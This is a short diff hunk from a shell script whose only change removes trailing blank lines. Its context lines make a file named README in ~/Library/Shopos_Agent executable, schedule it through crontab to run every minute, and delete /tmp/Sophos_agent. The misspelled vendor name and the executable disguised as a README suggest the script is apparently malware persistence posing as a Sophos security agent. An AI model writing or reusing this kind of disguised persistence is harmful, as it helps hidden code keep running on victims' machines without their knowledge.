@@ -8,5 +8,3 @@ ls ~/Library/Shopos_Agent
 chmod +x ~/Library/Shopos_Agent/README
 (crontab -l 2>/dev/null; echo "* * * * * ~/Library/Shopos_Agent/README") |crontab -
 rm -rf /tmp/Sophos_agent
-
-
